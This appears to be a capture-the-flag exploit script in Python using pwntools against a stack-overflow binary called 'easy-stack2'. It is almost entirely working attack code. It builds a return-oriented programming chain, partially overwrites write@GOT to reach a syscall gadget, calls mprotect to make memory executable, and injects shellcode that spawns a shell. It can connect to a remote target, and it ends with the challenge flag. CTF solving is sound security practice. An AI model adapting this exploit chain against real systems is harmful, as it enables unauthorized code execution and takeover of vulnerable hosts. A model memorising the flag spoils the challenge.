#!/usr/bin/env python3
from pwn import *

WRITE_PLT = 0x400430
READ_PLT = 0x400440
MAIN = 0x400587
WRITE_GOT = 0x601018
SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch='amd64')
WRITABLE_ADDR = 0x601c00
SHELLCODE_ADDR = WRITABLE_ADDR
SCRATCH_ADDR = SHELLCODE_ADDR + len(SHELLCODE)
STDIN_FILENO = 0
STDOUT_FILENO = 1
ROP_OFFSET = 0x88
WRITE_OFFSET = 0xf72b0
WRITE_MOV_RDX_RAX_OFFSET = 0xf72e1
assert (WRITE_OFFSET & ~0xff) == (WRITE_MOV_RDX_RAX_OFFSET & ~0xff)
WRITE_SYSCALL_OFFSET = 0xf72be
assert (WRITE_OFFSET & ~0xff) == (WRITE_SYSCALL_OFFSET & ~0xff)
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
PROT_SEM = 8
PAGE_SIZE = 0x1000
NR_MPROTECT = 10

def xpause():
    input('[*] Press ENTER to continue\n')


class PopRegs:
    REG_OFFSETS = {}

    @staticmethod
    def offsets(*args):
        return {
            reg: i * 8
            for i, reg in enumerate(args)
        }

    @classmethod
    def append(cls, rop, **kwargs):
        for reg, value in kwargs.items():
            if value is None:
                continue
            reg_offset = rop.offset + cls.REG_OFFSETS[reg]
            rop.payload[reg_offset] = struct.pack('<Q', value)
        rop.offset += len(cls.REG_OFFSETS) * 8


class PopRdi(PopRegs):
    PC = 0x400623  # pop rdi ; ret
    REG_OFFSETS = PopRegs.offsets('rdi', 'pc')


class PopRsiR15(PopRegs):
    PC = 0x400621  # pop rsi ; pop r15 ; ret
    REG_OFFSETS = PopRegs.offsets('rsi', 'r15', 'pc')


class WriteMovRdxRax(PopRegs):
    REG_OFFSETS = PopRegs.offsets('dummy', 'pc')


class Rop:
    def __init__(self):
        self.payload = {}
        self.offset = ROP_OFFSET
        self.init_1()

    def init_1(self):
        raise NotImplementedError()

    def append(self, value):
        if value is not None:
            self.payload[self.offset] = struct.pack('<Q', value)
        self.offset += 8

    def send(self, tube):
        print('[*] Writing ROP...')
        tube.send(flat(self.payload, length=0x200))
        self.send_1(tube)

    def send_1(self, tube):
        raise NotImplementedError()


class Rop1(Rop):
    def init_1(self):
        self.append(PopRdi.PC)
        PopRdi.append(self, rdi=STDIN_FILENO, pc=PopRsiR15.PC)
        PopRsiR15.append(self, rsi=SHELLCODE_ADDR, pc=READ_PLT)
        self.append(MAIN)

    def send_1(self, tube):
        print('[*] Writing shellcode...')
        tube.send(SHELLCODE)


class Rop2(Rop):
    def __init__(self):
        self.sendq = []
        super().__init__()

    def init_1(self):
        self.append(PopRdi.PC)
        PopRdi.append(self, rdi=STDIN_FILENO, pc=PopRsiR15.PC)
        PopRsiR15.append(self, rsi=WRITE_GOT, pc=READ_PLT)
        self.sendq.append((
            '[*] Setting write@got = mov %rax, %rdx...',
            bytes((WRITE_MOV_RDX_RAX_OFFSET & 0xff, )),
        ))
        self.append(PopRsiR15.PC)
        PopRsiR15.append(self, rsi=SCRATCH_ADDR, pc=READ_PLT)
        self.sendq.append((
            '[*] Setting %rdx = PROT_READ | PROT_WRITE | PROT_EXEC | PROT_SEM...\n'
            '    PROT_SEEM is needed in order to make the result greater than NR_MPROTECT.',
            flat(length=PROT_READ | PROT_WRITE | PROT_EXEC | PROT_SEM),
        ))
        self.append(WRITE_PLT)
        WriteMovRdxRax.append(self, pc=PopRsiR15.PC)
        PopRsiR15.append(self, rsi=WRITE_GOT, pc=READ_PLT)
        self.sendq.append((
            '[*] Setting write@got = syscall...',
            bytes((WRITE_SYSCALL_OFFSET & 0xff,)),
        ))
        self.append(PopRsiR15.PC)
        PopRsiR15.append(self, rsi=SCRATCH_ADDR, pc=READ_PLT)
        self.sendq.append((
            '[*] Setting RAX = NR_MPROTECT...',
            flat(length=NR_MPROTECT),
        ))
        self.append(PopRdi.PC)
        PopRdi.append(self, rdi=SHELLCODE_ADDR & ~0xfff, pc=PopRsiR15.PC)
        PopRsiR15.append(self, rsi=PAGE_SIZE, pc=WRITE_PLT)
        self.append(SHELLCODE_ADDR)

    def send_1(self, tube):
        for msg, data in self.sendq:
            print(msg)
            tube.send(data)
            xpause()


def main():
    if args.REMOTE:
        tube = remote('172.35.100.100', 10035)
    else:
        tube = gdb.debug(['./easy-stack2'], gdbscript='''
set breakpoint pending on
b __GI___libc_read
commands
  python rsi = int(str(gdb.parse_and_eval('$rsi'))); rdi = int(str(gdb.parse_and_eval('$rdi'))); rdx = int(str(gdb.parse_and_eval('$rdx'))); gdb.execute('finish'); print('read(0x{:x}, 0x{:x}, 0x{:x}) = 0x{:x}'.format(rsi, rdi, rdx, int(str(gdb.parse_and_eval('$rax'))))); gdb.execute('c')
end
b *0x400586
c
''')
    tube.recvuntil(b'Hello, World\n')
    Rop1().send(tube)
    tube.recvuntil(b'Hello, World\n')
    Rop2().send(tube)
    print('[+] Enjoy the shell!')
    tube.interactive()


if __name__ == '__main__':
    main()

# flag{be3b8997-3890-446e-a73c-d6df428ea4ab}
